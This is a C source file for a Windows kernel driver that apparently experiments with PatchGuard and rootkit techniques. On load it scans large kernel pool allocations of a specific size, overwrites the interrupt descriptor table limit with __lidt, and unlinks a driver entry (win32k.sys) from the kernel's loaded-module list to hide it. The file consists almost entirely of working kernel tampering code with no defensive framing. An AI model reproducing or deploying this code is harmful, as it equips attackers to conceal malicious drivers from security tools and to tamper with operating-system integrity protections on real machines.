#include <ntifs.h>
#include <ntddk.h>
#include <intrin.h>

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation = 0,
    SystemProcessorInformation = 1,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemPathInformation = 4,
    SystemProcessInformation = 5,
    SystemCallCountInformation = 6,
    SystemDeviceInformation = 7,
    SystemProcessorPerformanceInformation = 8,
    SystemFlagsInformation = 9,
    SystemCallTimeInformation = 10,
    SystemModuleInformation = 11,
    SystemLocksInformation = 12,
    SystemStackTraceInformation = 13,
    SystemPagedPoolInformation = 14,
    SystemNonPagedPoolInformation = 15,
    SystemHandleInformation = 16,
    SystemObjectInformation = 17,
    SystemPageFileInformation = 18,
    SystemVdmInstemulInformation = 19,
    SystemVdmBopInformation = 20,
    SystemFileCacheInformation = 21,
    SystemPoolTagInformation = 22,
    SystemInterruptInformation = 23,
    SystemDpcBehaviorInformation = 24,
    SystemFullMemoryInformation = 25,
    SystemLoadGdiDriverInformation = 26,
    SystemUnloadGdiDriverInformation = 27,
    SystemTimeAdjustmentInformation = 28,
    SystemSummaryMemoryInformation = 29,
    SystemMirrorMemoryInformation = 30,
    SystemPerformanceTraceInformation = 31,
    SystemObsolete0 = 32,
    SystemExceptionInformation = 33,
    SystemCrashDumpStateInformation = 34,
    SystemKernelDebuggerInformation = 35,
    SystemContextSwitchInformation = 36,
    SystemRegistryQuotaInformation = 37,
    SystemExtendServiceTableInformation = 38,
    SystemPrioritySeperation = 39,
    SystemVerifierAddDriverInformation = 40,
    SystemVerifierRemoveDriverInformation = 41,
    SystemProcessorIdleInformation = 42,
    SystemLegacyDriverInformation = 43,
    SystemCurrentTimeZoneInformation = 44,
    SystemLookasideInformation = 45,
    SystemTimeSlipNotification = 46,
    SystemSessionCreate = 47,
    SystemSessionDetach = 48,
    SystemSessionInformation = 49,
    SystemRangeStartInformation = 50,
    SystemVerifierInformation = 51,
    SystemVerifierThunkExtend = 52,
    SystemSessionProcessInformation = 53,
    SystemLoadGdiDriverInSystemSpace = 54,
    SystemNumaProcessorMap = 55,
    SystemPrefetcherInformation = 56,
    SystemExtendedProcessInformation = 57,
    SystemRecommendedSharedDataAlignment = 58,
    SystemComPlusPackage = 59,
    SystemNumaAvailableMemory = 60,
    SystemProcessorPowerInformation = 61,
    SystemEmulationBasicInformation = 62,
    SystemEmulationProcessorInformation = 63,
    SystemExtendedHandleInformation = 64,
    SystemLostDelayedWriteInformation = 65,
    SystemBigPoolInformation = 66,
    SystemSessionPoolTagInformation = 67,
    SystemSessionMappedViewInformation = 68,
    SystemHotpatchInformation = 69,
    SystemObjectSecurityMode = 70,
    SystemWatchdogTimerHandler = 71,
    SystemWatchdogTimerInformation = 72,
    SystemLogicalProcessorInformation = 73,
    SystemWow64SharedInformationObsolete = 74,
    SystemRegisterFirmwareTableInformationHandler = 75,
    SystemFirmwareTableInformation = 76,
    SystemModuleInformationEx = 77,
    SystemVerifierTriageInformation = 78,
    SystemSuperfetchInformation = 79,
    SystemMemoryListInformation = 80,
    SystemFileCacheInformationEx = 81,
    SystemThreadPriorityClientIdInformation = 82,
    SystemProcessorIdleCycleTimeInformation = 83,
    SystemVerifierCancellationInformation = 84,
    SystemProcessorPowerInformationEx = 85,
    SystemRefTraceInformation = 86,
    SystemSpecialPoolInformation = 87,
    SystemProcessIdInformation = 88,
    SystemErrorPortInformation = 89,
    SystemBootEnvironmentInformation = 90,
    SystemHypervisorInformation = 91,
    SystemVerifierInformationEx = 92,
    SystemTimeZoneInformation = 93,
    SystemImageFileExecutionOptionsInformation = 94,
    SystemCoverageInformation = 95,
    SystemPrefetchPatchInformation = 96,
    SystemVerifierFaultsInformation = 97,
    SystemSystemPartitionInformation = 98,
    SystemSystemDiskInformation = 99,
    SystemProcessorPerformanceDistribution = 100,
    SystemNumaProximityNodeInformation = 101,
    SystemDynamicTimeZoneInformation = 102,
    SystemCodeIntegrityInformation = 103,
    SystemProcessorMicrocodeUpdateInformation = 104,
    SystemProcessorBrandString = 105,
    SystemVirtualAddressInformation = 106,
    SystemLogicalProcessorAndGroupInformation = 107,
    SystemProcessorCycleTimeInformation = 108,
    SystemStoreInformation = 109,
    SystemRegistryAppendString = 110,
    SystemAitSamplingValue = 111,
    SystemVhdBootInformation = 112,
    SystemCpuQuotaInformation = 113,
    SystemNativeBasicInformation = 114,
    SystemErrorPortTimeouts = 115,
    SystemLowPriorityIoInformation = 116,
    SystemBootEntropyInformation = 117,
    SystemVerifierCountersInformation = 118,
    SystemPagedPoolInformationEx = 119,
    SystemSystemPtesInformationEx = 120,
    SystemNodeDistanceInformation = 121,
    SystemAcpiAuditInformation = 122,
    SystemBasicPerformanceInformation = 123,
    SystemQueryPerformanceCounterInformation = 124,
    SystemSessionBigPoolInformation = 125,
    SystemBootGraphicsInformation = 126,
    SystemScrubPhysicalMemoryInformation = 127,
    SystemBadPageInformation = 128,
    SystemProcessorProfileControlArea = 129,
    SystemCombinePhysicalMemoryInformation = 130,
    SystemEntropyInterruptTimingInformation = 131,
    SystemConsoleInformation = 132,
    SystemPlatformBinaryInformation = 133,
    SystemPolicyInformation = 134,
    SystemHypervisorProcessorCountInformation = 135,
    SystemDeviceDataInformation = 136,
    SystemDeviceDataEnumerationInformation = 137,
    SystemMemoryTopologyInformation = 138,
    SystemMemoryChannelInformation = 139,
    SystemBootLogoInformation = 140,
    SystemProcessorPerformanceInformationEx = 141,
    SystemSpare0 = 142,
    SystemSecureBootPolicyInformation = 143,
    SystemPageFileInformationEx = 144,
    SystemSecureBootInformation = 145,
    SystemEntropyInterruptTimingRawInformation = 146,
    SystemPortableWorkspaceEfiLauncherInformation = 147,
    SystemFullProcessInformation = 148,
    SystemKernelDebuggerInformationEx = 149,
    SystemBootMetadataInformation = 150,
    SystemSoftRebootInformation = 151,
    SystemElamCertificateInformation = 152,
    SystemOfflineDumpConfigInformation = 153,
    SystemProcessorFeaturesInformation = 154,
    SystemRegistryReconciliationInformation = 155,
    SystemEdidInformation = 156,
    MaxSystemInfoClass = 157
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_BIGPOOL_ENTRY
{
    union {
        PVOID VirtualAddress;
        ULONG_PTR NonPaged : 1;
    };
    ULONG_PTR SizeInBytes;
    union {
        UCHAR Tag[4];
        ULONG TagUlong;
    };
} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

//from http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/bigpool.htm
typedef struct _SYSTEM_BIGPOOL_INFORMATION {
    ULONG Count;
    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ANYSIZE_ARRAY];
} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID                   SystemInformation,
    IN ULONG                    Length,
    OUT PULONG                  ReturnLength
);

typedef struct _KLDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY64 InLoadOrderLinks;
    ULONG64 __Undefined1;
    ULONG64 __Undefined2;
    ULONG64 __Undefined3;
    ULONG64 NonPagedDebugInfo;
    ULONG64 DllBase;
    ULONG64 EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG   Flags;
    USHORT  LoadCount;
    USHORT  __Undefined5;
    ULONG64 __Undefined6;
    ULONG   CheckSum;
    ULONG   __padding1;
    ULONG   TimeDateStamp;
    ULONG   __padding2;
}KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY
{
    ULONG Unknow1;
    ULONG Unknow2;
    ULONG Unknow3;
    ULONG Unknow4;
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    char ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
    ULONG Count;//内核中以加载的模块的个数
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

#define DPRINT(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, __VA_ARGS__)
#define LOG_DEBUG(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, __VA_ARGS__)

#pragma pack(1)
typedef struct {
    USHORT limit;
    ULONG64 BASE;
}IDT_INFO, *PIDT_INFO;

#pragma pack()

void make_pg_fire()
{
    IDT_INFO idt = {0};
    __sidt(&idt);
    // const auto old_limit = idt.limit;
    idt.limit = 0xffff;
    __lidt(&idt);
    __sidt(&idt);
}

void DriverUnload(PDRIVER_OBJECT pDriverObject)
{

}

ULONG64 GetSystemModuleBase(char* lpModuleName)
{
    ULONG NeedSize, i, ModuleCount, BufferSize = 0x5000;
    PVOID pBuffer = NULL;
    PCHAR pDrvName = NULL;
    NTSTATUS Result;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;
    do
    {
        //分配内存

        pBuffer = ExAllocatePool(NonPagedPool, BufferSize);
        if (pBuffer == NULL)
            return 0;
        //查询模块信息
        Result = ZwQuerySystemInformation(11, pBuffer, BufferSize, &NeedSize);
        if (Result == STATUS_INFO_LENGTH_MISMATCH)
        {
            ExFreePool(pBuffer);
            BufferSize *= 2;
        }
        else if (!NT_SUCCESS(Result))
        {
            //查询失败则退出
            ExFreePool(pBuffer);
            return 0;
        }
    } while (Result == STATUS_INFO_LENGTH_MISMATCH);
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)pBuffer;
    //获得模块的总数量
    ModuleCount = pSystemModuleInformation->Count;
    //遍历所有的模块
    for (i = 0; i < ModuleCount; i++)
    {
        if ((ULONG64)(pSystemModuleInformation->Module[i].Base) > (ULONG64)0x8000000000000000)
        {
            pDrvName = pSystemModuleInformation->Module[i].ImageName + pSystemModuleInformation->Module[i].ModuleNameOffset;
            if (_stricmp(pDrvName, lpModuleName) == 0)
                return (ULONG64)pSystemModuleInformation->Module[i].Base;
        }
    }
    ExFreePool(pBuffer);
    return 0;
}

VOID HideDriver(PDRIVER_OBJECT pDriverObject, char *pDrvName)
{
    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
    PKLDR_DATA_TABLE_ENTRY firstentry;
    ULONG64 pDrvBase = 0;
    KIRQL OldIrql;
    firstentry = entry;
    pDrvBase = GetSystemModuleBase(pDrvName);
    while ((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != firstentry)
    {
        if (entry->DllBase == pDrvBase)
        {
            //typedef struct LIST_ENTRY64 {
            //	ULONGLONG Flink;
            //	ULONGLONG Blink;
            //} LIST_ENTRY64;
            //typedef LIST_ENTRY64 *PLIST_ENTRY64;
            //le->Flink->Blink=le->Blink;
            //le->Blink->Flink=le->Flink;
            OldIrql = KeRaiseIrqlToDpcLevel();
            ((LIST_ENTRY64*)(entry->InLoadOrderLinks.Flink))->Blink = entry->InLoadOrderLinks.Blink;
            ((LIST_ENTRY64*)(entry->InLoadOrderLinks.Blink))->Flink = entry->InLoadOrderLinks.Flink;
            entry->InLoadOrderLinks.Flink = 0;
            entry->InLoadOrderLinks.Blink = 0;
            KeLowerIrql(OldIrql);
            DPRINT("Remove LIST_ENTRY64 OK!\n");
            break;
        }
        //kprintf("%llx\t%wZ\t%wZ",entry->DllBase,entry->BaseDllName,entry->FullDllName);
        entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
    }
}

PVOID get_sysinfo(SYSTEM_INFORMATION_CLASS InfoClass)
{
    NTSTATUS ns;
    ULONG RetSize, Size = 0x1100;
    PVOID Info;

    while (1)
    {
        if ((Info = ExAllocatePool(NonPagedPool, Size)) == NULL)
        {
            return NULL;
        }

        RetSize = 0;
        ns = ZwQuerySystemInformation(InfoClass, Info, Size, &RetSize);
        if (ns == STATUS_INFO_LENGTH_MISMATCH)
        {
            ExFreePool(Info);
            Info = NULL;

            if (RetSize > 0)
            {
                Size = RetSize + 0x1000;
            }
            else
                break;
        }
        else
            break;
    }

    if (!NT_SUCCESS(ns))
    {
        if (Info)
            ExFreePool(Info);

        return NULL;
    }
    return Info;
}



void EnumBig()
{
    PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)(get_sysinfo(SystemBigPoolInformation));
    if (pBigPoolInfo)
    {
        for (ULONG i = 0; i < pBigPoolInfo->Count; i++) {
            SYSTEM_BIGPOOL_ENTRY poolEntry = pBigPoolInfo->AllocatedInfo[i];
            if (poolEntry.SizeInBytes >= 0x18e00)
            {

                if (MmIsAddressValid(poolEntry.VirtualAddress))
                {
                    LOG_DEBUG("Tag: %.*s, Address: 0x%p, Size: 0x%p\r\n", 4, poolEntry.Tag, poolEntry.VirtualAddress, (PVOID)poolEntry.SizeInBytes);
                }
            }
        }
    }
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegisterPath)
{
    DPRINT("driver loaded\n");

    EnumBig();
    make_pg_fire();
    HideDriver(pDriverObject, "win32k.sys");
    pDriverObject->DriverUnload = DriverUnload;

    return STATUS_SUCCESS;
}